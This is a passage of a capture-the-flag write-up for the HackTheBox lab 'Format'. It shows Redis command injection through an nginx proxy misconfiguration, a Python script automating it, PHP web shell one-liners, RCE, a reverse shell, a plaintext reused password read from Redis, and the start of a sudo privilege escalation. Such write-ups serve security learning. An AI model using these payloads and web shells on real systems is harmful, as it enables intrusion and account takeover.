<span class="m">470</span>:M<span class="w"> </span><span class="m">19</span><span class="w"> </span>May<span class="w"> </span><span class="m">2023</span><span class="w"> </span><span class="m">09</span>:06:49.647<span class="w"> </span>*<span class="w"> </span>Ready<span class="w"> </span>to<span class="w"> </span>accept<span class="w"> </span>connections
<span class="m">470</span>:M<span class="w"> </span><span class="m">19</span><span class="w"> </span>May<span class="w"> </span><span class="m">2023</span><span class="w"> </span><span class="m">09</span>:06:49.647<span class="w"> </span>*<span class="w"> </span>The<span class="w"> </span>server<span class="w"> </span>is<span class="w"> </span>now<span class="w"> </span>ready<span class="w"> </span>to<span class="w"> </span>accept<span class="w"> </span>connections<span class="w"> </span>at<span class="w"> </span>/var/run/redis/redis.sock
^Z
<span class="o">[</span><span class="m">1</span><span class="o">]</span>+<span class="w">  </span>Stopped<span class="w">                 </span>redis-server<span class="w"> </span>redis.conf
root@3a4dd12cf617:/data#<span class="w"> </span><span class="nb">bg</span>
<span class="o">[</span><span class="m">1</span><span class="o">]</span>+<span class="w"> </span>redis-server<span class="w"> </span>redis.conf<span class="w"> </span><span class="p">&amp;</span>
</pre></div>
</div>
<p>It created the socket</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>root@3a4dd12cf617:/data#<span class="w"> </span>ls<span class="w"> </span>-la<span class="w"> </span>/var/run/redis/redis.sock
srwxrwxr-x<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">0</span><span class="w"> </span>May<span class="w"> </span><span class="m">19</span><span class="w"> </span><span class="m">09</span>:06<span class="w"> </span>/var/run/redis/redis.sock
</pre></div>
</div>
<p>And also exposes it on the default redis tcp port, we won’t use it though</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>root@3a4dd12cf617:/data#<span class="w"> </span>netstat<span class="w"> </span>-tulpen
Active<span class="w"> </span>Internet<span class="w"> </span>connections<span class="w"> </span><span class="o">(</span>only<span class="w"> </span>servers<span class="o">)</span>
Proto<span class="w"> </span>Recv-Q<span class="w"> </span>Send-Q<span class="w"> </span>Local<span class="w"> </span>Address<span class="w">           </span>Foreign<span class="w"> </span>Address<span class="w">         </span>State<span class="w">       </span>User<span class="w">       </span>Inode<span class="w">      </span>PID/Program<span class="w"> </span>name
tcp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">0</span>.0.0.0:6379<span class="w">            </span><span class="m">0</span>.0.0.0:*<span class="w">               </span>LISTEN<span class="w">      </span><span class="m">0</span><span class="w">          </span><span class="m">1458107</span><span class="w">    </span><span class="m">470</span>/redis-server<span class="w"> </span>*:
tcp6<span class="w">       </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span>:::6379<span class="w">                 </span>:::*<span class="w">                    </span>LISTEN<span class="w">      </span><span class="m">0</span><span class="w">          </span><span class="m">1458108</span><span class="w">    </span><span class="m">470</span>/redis-server<span class="w"> </span>*:
</pre></div>
</div>
<p>Looking at my <a class="reference internal" href="../../../../other/dba/dba.html"><span class="doc std std-doc">notes</span></a> to try and remember how things work in redis</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>root@3a4dd12cf617:/data#<span class="w"> </span>redis-cli<span class="w"> </span>-s<span class="w"> </span>/var/run/redis/redis.sock
redis<span class="w"> </span>/var/run/redis/redis.sock&gt;<span class="w"> </span>MSET<span class="w"> </span>hacked<span class="w"> </span><span class="nb">true</span>
OK
redis<span class="w"> </span>/var/run/redis/redis.sock&gt;<span class="w"> </span>MGET<span class="w"> </span>hacked
<span class="m">1</span><span class="o">)</span><span class="w"> </span><span class="s2">&quot;true&quot;</span>
</pre></div>
</div>
<p>Talking directly to the UDS with ncat</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>root@3a4dd12cf617:/data#<span class="w"> </span>nc<span class="w"> </span>-U<span class="w"> </span>/var/run/redis/redis.sock
MGET<span class="w"> </span>hacked
*1
<span class="nv">$4</span>
<span class="nb">true</span>
</pre></div>
</div>
<p><a class="reference external" href="https://redis.io/commands/get/">https://redis.io/commands/get/</a><br />
<a class="reference external" href="https://redis.io/commands/mget/">https://redis.io/commands/mget/</a><br />
<a class="reference external" href="https://redis.io/commands/hget/">https://redis.io/commands/hget/</a></p>
<p>The php code in <code class="docutils literal notranslate"><span class="pre">sunny/edit/index.php</span></code> uses a <code class="docutils literal notranslate"><span class="pre">HGET</span></code> to check the value or the <code class="docutils literal notranslate"><span class="pre">pro</span></code> key in the user’s hash, if true, we get the image upload feature</p>
<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="x">function isPro() {</span>
<span class="x">    if(isset($_SESSION[&#39;username&#39;])) {</span>
<span class="x">        $redis = new Redis();</span>
<span class="x">        $redis-&gt;connect(&#39;/var/run/redis/redis.sock&#39;);</span>
<span class="x">        $pro = $redis-&gt;HGET($_SESSION[&#39;username&#39;], &quot;pro&quot;);</span>
<span class="x">        return strval($pro);</span>
<span class="x">    }</span>
<span class="x">    return &quot;false&quot;;</span>
<span class="x">}</span>
</pre></div>
</div>
<p>So we need to do something like that:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>root@3a4dd12cf617:/data#<span class="w"> </span>redis-cli<span class="w"> </span>-s<span class="w"> </span>/var/run/redis/redis.sock
redis<span class="w"> </span>/var/run/redis/redis.sock&gt;<span class="w"> </span>HSET<span class="w"> </span>asdf<span class="w"> </span>pro<span class="w"> </span><span class="nb">true</span>
<span class="o">(</span>integer<span class="o">)</span><span class="w"> </span><span class="m">1</span>
redis<span class="w"> </span>/var/run/redis/redis.sock&gt;<span class="w"> </span>HGET<span class="w"> </span>asdf<span class="w"> </span>pro
<span class="s2">&quot;true&quot;</span>
</pre></div>
</div>
<p>According to the nginx proxy rule we’ve leaked through the LFI we should be able to translate a request this way:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">microblog</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">static</span><span class="o">/</span><span class="n">unix</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">redis</span><span class="o">/</span><span class="n">redis</span><span class="o">.</span><span class="n">sock</span><span class="p">:</span><span class="n">asdf</span><span class="o">%</span><span class="mi">20</span><span class="n">pro</span><span class="o">%</span><span class="mi">20</span><span class="n">true</span><span class="o">%</span><span class="mi">20</span><span class="o">/</span><span class="n">asdf</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">asdf</span><span class="o">.</span><span class="n">microbucket</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">unix</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">redis</span><span class="o">/</span><span class="n">redis</span><span class="o">.</span><span class="n">sock</span><span class="p">:</span><span class="n">asdf</span><span class="o">%</span><span class="mi">20</span><span class="n">pro</span><span class="o">%</span><span class="mi">20</span><span class="n">true</span><span class="o">%</span><span class="mi">20</span>
</pre></div>
</div>
<p>So if we change the HTTP method to the relevant redis command:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">HSET</span> <span class="o">/</span><span class="n">static</span><span class="o">/</span><span class="n">unix</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">redis</span><span class="o">/</span><span class="n">redis</span><span class="o">.</span><span class="n">sock</span><span class="p">:</span><span class="n">asdf</span><span class="o">%</span><span class="mi">20</span><span class="n">pro</span><span class="o">%</span><span class="mi">20</span><span class="n">true</span><span class="o">%</span><span class="mi">20</span><span class="o">/</span><span class="n">asdf</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="n">Host</span><span class="p">:</span> <span class="n">microblog</span><span class="o">.</span><span class="n">htb</span>


</pre></div>
</div>
<p>it would correspond to this in redis-cli:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>redis-cli<span class="w"> </span>-s<span class="w"> </span>unix:/var/run/redis/redis.sock<span class="w"> </span>HSET<span class="w"> </span>asdf<span class="w"> </span>pro<span class="w"> </span><span class="nb">true</span>
</pre></div>
</div>
<p>And it is interesting to note that apparently curl will let you do that…<br />
So let’s try it out</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-XHSET<span class="w"> </span>http://microblog.htb/static/unix:/var/run/redis/redis.sock:asdf%20pro%20true%20/asdf
&lt;html&gt;
&lt;head&gt;&lt;title&gt;502<span class="w"> </span>Bad<span class="w"> </span>Gateway&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
&lt;center&gt;&lt;h1&gt;502<span class="w"> </span>Bad<span class="w"> </span>Gateway&lt;/h1&gt;&lt;/center&gt;
&lt;hr&gt;&lt;center&gt;nginx/1.18.0&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;
</pre></div>
</div>
<p>Nice!<br />
<img alt="pro.png" src="../../../../_images/pro.png" /></p>
</section>
<section id="automating-the-exploit">
<h2>Automating the exploit<a class="headerlink" href="#automating-the-exploit" title="Permalink to this heading">#</a></h2>
<p>The users are getting wiped quite frequently, and automating that looked like a fun exercise. Also because python requests wouldn’t let us do the cool trick we did with curl, using an invalid HTTP method… I had to do it in raw bytes in a TCP socket. I think it helped me a lot in getting a better understanding of how the proxy exploit works since we’re working directly with what the actual bytes look like in the HTTP request.</p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">simple_chalk</span><span class="w"> </span><span class="kn">import</span> <span class="n">green</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>


<span class="n">PROXY</span> <span class="o">=</span> <span class="s1">&#39;http://127.0.0.1:8080&#39;</span>
<span class="n">DOMAIN</span> <span class="o">=</span> <span class="s1">&#39;microblog.htb&#39;</span>
<span class="n">HEADERS</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;application/x-www-form-urlencoded&#39;</span><span class="p">}</span>
<span class="n">USER</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>


<span class="k">def</span><span class="w"> </span><span class="nf">login</span><span class="p">():</span>
    <span class="n">data</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;username=</span><span class="si">{</span><span class="n">USER</span><span class="si">}</span><span class="s1">&amp;password=</span><span class="si">{</span><span class="n">USER</span><span class="si">}</span><span class="s1">&#39;</span>
    <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;http://app.</span><span class="si">{</span><span class="n">DOMAIN</span><span class="si">}</span><span class="s1">/login/index.php&#39;</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">HEADERS</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;http&#39;</span><span class="p">:</span> <span class="n">PROXY</span><span class="p">})</span>
    <span class="n">cookie</span> <span class="o">=</span> <span class="n">res</span><span class="o">.</span><span class="n">history</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get_dict</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">cookie</span>


<span class="k">def</span><span class="w"> </span><span class="nf">register</span><span class="p">():</span>
    <span class="n">data</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;first-name=</span><span class="si">{</span><span class="n">USER</span><span class="si">}</span><span class="s1">&amp;&#39;</span>\
           <span class="sa">f</span><span class="s1">&#39;last-name=</span><span class="si">{</span><span class="n">USER</span><span class="si">}</span><span class="s1">&amp;&#39;</span>\
           <span class="sa">f</span><span class="s1">&#39;username=</span><span class="si">{</span><span class="n">USER</span><span class="si">}</span><span class="s1">&amp;&#39;</span>\
           <span class="sa">f</span><span class="s1">&#39;password=</span><span class="si">{</span><span class="n">USER</span><span class="si">}</span><span class="s1">&#39;</span>
    <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;http://app.</span><span class="si">{</span><span class="n">DOMAIN</span><span class="si">}</span><span class="s1">/register/index.php&#39;</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">HEADERS</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;http&#39;</span><span class="p">:</span> <span class="n">PROXY</span><span class="p">})</span>
    <span class="k">if</span> <span class="s1">&#39;successful&#39;</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">url</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">green</span><span class="p">(</span><span class="s2">&quot;[+]&quot;</span><span class="p">)</span><span class="si">}</span><span class="s1"> User successfully registered&#39;</span><span class="p">)</span>
        <span class="n">cookie</span> <span class="o">=</span> <span class="n">res</span><span class="o">.</span><span class="n">history</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get_dict</span><span class="p">()</span>
    <span class="k">if</span> <span class="s1">&#39;already&#39;</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">url</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">green</span><span class="p">(</span><span class="s2">&quot;[+]&quot;</span><span class="p">)</span><span class="si">}</span><span class="s1"> User already exists&#39;</span><span class="p">)</span>
        <span class="n">cookie</span> <span class="o">=</span> <span class="n">login</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">cookie</span>


<span class="k">def</span><span class="w"> </span><span class="nf">create_blog</span><span class="p">(</span><span class="n">cookies</span><span class="p">):</span>
    <span class="n">data</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;new-blog-name=</span><span class="si">{</span><span class="n">USER</span><span class="si">}</span><span class="s1">&#39;</span>
    <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;http://app.</span><span class="si">{</span><span class="n">DOMAIN</span><span class="si">}</span><span class="s1">/dashboard/index.php&#39;</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
        <span class="n">url</span><span class="p">,</span>
        <span class="n">data</span><span class="p">,</span>
        <span class="n">headers</span><span class="o">=</span><span class="n">HEADERS</span><span class="p">,</span>
        <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span>
        <span class="n">proxies</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;http&#39;</span><span class="p">:</span> <span class="n">PROXY</span><span class="p">}</span>
    <span class="p">)</span>
    <span class="k">if</span> <span class="s1">&#39;already&#39;</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">url</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">green</span><span class="p">(</span><span class="s2">&quot;[+]&quot;</span><span class="p">)</span><span class="si">}</span><span class="s1"> Blog already exists&#39;</span><span class="p">)</span>
    <span class="k">if</span> <span class="s1">&#39;successful&#39;</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">url</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">green</span><span class="p">(</span><span class="s2">&quot;[+]&quot;</span><span class="p">)</span><span class="si">}</span><span class="s1"> Blog successfully created&#39;</span><span class="p">)</span>


<span class="k">def</span><span class="w"> </span><span class="nf">brush_like_a_pro</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Get an oral-B toothbrush from Redis&quot;&quot;&quot;</span>
    <span class="n">uds</span> <span class="o">=</span> <span class="s1">&#39;unix:/var/run/redis/redis.sock&#39;</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;HSET /static/</span><span class="si">{</span><span class="n">uds</span><span class="si">}</span><span class="s1">:</span><span class="si">{</span><span class="n">USER</span><span class="si">}</span><span class="s1">%20pro%20true%20/</span><span class="si">{</span><span class="n">USER</span><span class="si">}</span><span class="s1"> HTTP/1.1</span><span class="se">\r\n</span><span class="s1">&#39;</span>\
              <span class="sa">f</span><span class="s1">&#39;Host: </span><span class="si">{</span><span class="n">DOMAIN</span><span class="si">}</span><span class="se">\r\n</span><span class="s1">&#39;</span>\
              <span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
    <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">DOMAIN</span><span class="p">,</span> <span class="mi">80</span><span class="p">))</span>
    <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
    <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
    <span class="k">if</span> <span class="s1">&#39;502 Bad Gateway&#39;</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">decode</span><span class="p">():</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">green</span><span class="p">(</span><span class="s2">&quot;[+]&quot;</span><span class="p">)</span><span class="si">}</span><span class="s1"> You can now brush like a pro 🪥&#39;</span><span class="p">)</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="n">cookies</span> <span class="o">=</span> <span class="n">register</span><span class="p">()</span>
    <span class="n">create_blog</span><span class="p">(</span><span class="n">cookies</span><span class="p">)</span>
    <span class="n">brush_like_a_pro</span><span class="p">()</span>

</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python3<span class="w"> </span>micro.py<span class="w"> </span>blnkn
<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>User<span class="w"> </span>successfully<span class="w"> </span>registered
<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Blog<span class="w"> </span>successfully<span class="w"> </span>created
<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>You<span class="w"> </span>can<span class="w"> </span>now<span class="w"> </span>brush<span class="w"> </span>like<span class="w"> </span>a<span class="w"> </span>pro<span class="w"> </span>🪥
</pre></div>
</div>
<p><img alt="ham.png" src="../../../../_images/ham.png" /></p>
<p>Yea boy… I’m a pro</p>
</section>
<section id="abusing-the-upload-feature-to-get-a-php-shell">
<h2>Abusing the upload feature to get a PHP shell<a class="headerlink" href="#abusing-the-upload-feature-to-get-a-php-shell" title="Permalink to this heading">#</a></h2>
<p>Grab some popcorn 🍿🍿<br />
<a class="reference external" href="https://github.com/samayo/bulletproof/issues/90">https://github.com/samayo/bulletproof</a></p>
<p>In depth explanation of how to reverse png compression filters to embed php in IDAT<br />
<a class="reference external" href="https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/">encoding-web-shells-in-png-idat</a></p>
<p>This article is also really good an gives a great of all the different ways to embed php in images:<br />
<a class="reference external" href="https://www.synacktiv.com/en/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there">https://www.synacktiv.com/en/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there</a></p>
<p>In french but also great content:<br />
<a class="reference external" href="https://phil242.wordpress.com/2014/02/23/la-png-qui-se-prenait-pour-du-php/">https://phil242.wordpress.com/2014/02/23/la-png-qui-se-prenait-pour-du-php/</a></p>
<p>Notes of some php things I could do</p>
<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span> <span class="nb">phpinfo</span><span class="p">();</span><span class="cp">?&gt;</span>
<span class="cp">&lt;?php</span> <span class="nb">exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span><span class="cp">?&gt;</span>
<span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span><span class="cp">?&gt;</span>
<span class="cp">&lt;?php</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span><span class="cp">?&gt;</span>
<span class="cp">&lt;?php</span> <span class="nv">$_GET</span><span class="p">[</span><span class="mi">0</span><span class="p">](</span><span class="nv">$_POST</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span><span class="cp">?&gt;</span>
<span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="mi">0</span><span class="p">](</span><span class="nv">$_POST</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span><span class="cp">?&gt;</span>
</pre></div>
</div>
<p>Note <code class="docutils literal notranslate"><span class="pre">&lt;?=</span></code> is a shortcut for <code class="docutils literal notranslate"><span class="pre">&lt;?php</span> <span class="pre">echo</span></code></p>
<p>I spent a bunch of time trying to include a php shell embeded in an image, as described in the links above:</p>
<ul class="simple">
<li><p>png with php appended to the end of it -&gt; caught</p></li>
<li><p>png with php in exif data -&gt; not caught</p></li>
<li><p>png with php in idat -&gt; not caught</p></li>
</ul>
<p>The extension of the uploaded things are still png though, so they need to be included somehow<br />
Maybe it’s possible, maybe it isn’t, in any case I just didn’t manage to make it work.<br />
I’m sure if it is possible IppSec will show us the way in a few month.</p>
<p>That beeing said, once we have pro, we have write access to <code class="docutils literal notranslate"><span class="pre">/var/www/microblog/blnkn/uploads/</span></code> so we can use the same bug that gave us LFI earlier to write a php shell in uploads, since we controll the path.<br />
<img alt="info-burp.png" src="../../../../_images/info-burp.png" /></p>
<p>Then just visit the upload path and we got RCE
<img alt="info.png" src="../../../../_images/info.png" /></p>
<p>Same concept with a reverse shell, and we get a callback as www-data
<img alt="rev-burp.png" src="../../../../_images/rev-burp.png" /></p>
</section>
<section id="privesc-from-www-data-to-cooper">
<h2>Privesc from www-data to cooper<a class="headerlink" href="#privesc-from-www-data-to-cooper" title="Permalink to this heading">#</a></h2>
<p>Cooper reused his unix password in his app, and since it is stored in plaintext in the redis hash, it’s easy to get.</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>redis-cli<span class="w"> </span>-s<span class="w"> </span>/var/run/redis/redis.sock

KEYS<span class="w"> </span>*
blnkn:sites
PHPREDIS_SESSION:t3g3i4m9j6a46dmv2hdaca9n07
blogger:sites
teo:sites
blogger
blnkn
cooper.dooper:sites
cooper.dooper
PHPREDIS_SESSION:6liutn3vgsftefhr0cjaqg40m0
teo
PHPREDIS_SESSION:tdhboofshr26rv81b7l6ji03dl
PHPREDIS_SESSION:nvmksha2oelt998m8vie9uka9e
PHPREDIS_SESSION:u5d6m7fs5lhvqa2aumlrol8etm
PHPREDIS_SESSION:oiadmngoa4uehic7u6h0bei8a5

HKEYS<span class="w"> </span>cooper.dooper
username
password
first-name
last-name
pro

HGET<span class="w"> </span>cooper.dooper<span class="w"> </span>password
zooperdoopercooper
</pre></div>
</div>
</section>
<section id="privesc-from-cooper-to-root">
<h2>Privesc from cooper to root<a class="headerlink" href="#privesc-from-cooper-to-root" title="Permalink to this heading">#</a></h2>
<p>Cooper can execute the pro licence provisioning script as root</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>cooper@format:~$<span class="w"> </span>sudo<span class="w"> </span>-l
<span class="o">[</span>sudo<span class="o">]</span><span class="w"> </span>password<span class="w"> </span><span class="k">for</span><span class="w"> </span>cooper:
Sorry,<span class="w"> </span>try<span class="w"> </span>again.
<span class="o">[</span>sudo<span class="o">]</span><span class="w"> </span>password<span class="w"> </span><span class="k">for</span><span class="w"> </span>cooper:
Matching<span class="w"> </span>Defaults<span class="w"> </span>entries<span class="w"> </span><span class="k">for</span><span class="w"> </span>cooper<span class="w"> </span>on<span class="w"> </span>format:
<span class="w">    </span>env_reset,<span class="w"> </span>mail_badpass,
<span class="w">    </span><span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin

User<span class="w"> </span>cooper<span class="w"> </span>may<span class="w"> </span>run<span class="w"> </span>the<span class="w"> </span>following<span class="w"> </span>commands<span class="w"> </span>on<span class="w"> </span>format:
<span class="w">    </span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span>/usr/bin/license
</pre></div>
</div>
<p>It works like that:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>cooper@format:~$ sudo /usr/bin/license -p blnkn

Plaintext license key:
------------------------------------------------------
microblogblnkn.HO[Vh.t4=]hEo~U-q}z_E_0M5TcSfPa;7_dV2zZblnknblnkn

Encrypted license key (distribute to customer):
------------------------------------------------------
gAAAAABkaNcxKqkvhqKsyP2hBWdnDVxkP-T1YxUWust-6UEzL0HToC0q_iYv1cJcEuZHAOqZsC0_dxtC_yhrZpUKPuokCLqCONHVFtd6QZVHOgEPId8MDybhl-XrVs-SV_uvlZsgw5MixGNuxnQ90QAuRM6g_7k11bljq_idNuD2VPxkL794qWo=
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>cooper@format:/usr/bin$<span class="w"> </span>sudo<span class="w"> </span>/usr/bin/license<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;gAAAAABkaNcxKqkvhqKsyP2hBWdnDVxkP-T1YxUWust-6UEzL0HToC0q_iYv1cJcEuZHAOqZsC0_dxtC_yhrZpUKPuokCLqCONHVFtd6QZVHOgEPId8MDybhl-XrVs-SV_uvlZsgw5MixGNuxnQ90QAuRM6g_7k11bljq_idNuD2VPxkL794qWo=&#39;</span>

License<span class="w"> </span>key<span class="w"> </span>valid!<span class="w"> </span>Decrypted<span class="w"> </span>value:
------------------------------------------------------
microblogblnkn.HO<span class="o">[</span>Vh.t4<span class="o">=]</span>hEo~U-q<span class="o">}</span>z_E_0M5TcSfPa<span class="p">;</span>7_dV2zZblnknblnkn
</pre></div>
</div>
<p>It’s fair to assume that what we’re after is the <code class="docutils literal notranslate"><span class="pre">secret_encoded</span></code> variable which is reading from <code class="docutils literal notranslate"><span class="pre">/root/license/secret</span></code><br />
Technically it’s the secret used to encode the license keys, but we know cooper is a password reuse ninja so… It’s worth a shot.</p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/python3</span>

<span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">cryptography.hazmat.backends</span><span class="w"> </span><span class="kn">import</span> <span class="n">default_backend</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">cryptography.hazmat.primitives</span><span class="w"> </span><span class="kn">import</span> <span class="n">hashes</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">cryptography.hazmat.primitives.kdf.pbkdf2</span><span class="w"> </span><span class="kn">import</span> <span class="n">PBKDF2HMAC</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">cryptography.fernet</span><span class="w"> </span><span class="kn">import</span> <span class="n">Fernet</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">random</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">string</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">datetime</span><span class="w"> </span><span class="kn">import</span> <span class="n">date</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">redis</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">argparse</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>

<span class="k">class</span><span class="w"> </span><span class="nc">License</span><span class="p">():</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">chars</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">punctuation</span>
